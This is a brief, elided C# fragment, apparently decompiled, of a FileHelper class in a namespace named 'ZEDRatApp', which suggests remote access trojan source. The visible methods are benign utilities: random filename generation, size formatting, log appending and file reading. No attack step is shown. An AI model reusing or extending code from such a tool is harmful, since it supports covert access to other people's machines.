...
namespace ZEDRatApp
{
	public static class FileHelper
	{
		...
		{
			return path.Any((char c) => FileHelper._illegalChars.Contains(c));
		}
		...
		public static string GetRandomFilename(int length, string extension = "")
		{
			...
			{
				stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[FileHelper._rnd.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".Length)]);
			}
		...
		{
			return FileHelper._rnd.Next(0, int.MaxValue) + o;
		}
		...
		public static string GetDataSize(long size)
		{
			double num = size;
			int num2 = 0;
			while (num >= 1024.0 && num2 + 1 < FileHelper._sizes.Length)
			{
				num2++;
				num /= 1024.0;
			}
			return $"{num:0.##} {FileHelper._sizes[num2]}";
		}
		...
		{
			appendText = FileHelper.ReadLogFile(filename) + appendText;
		...
		public static string ReadFile(string filename)
		{
			...
			return Encoding.UTF8.GetString(File.ReadAllBytes(filename));
		}
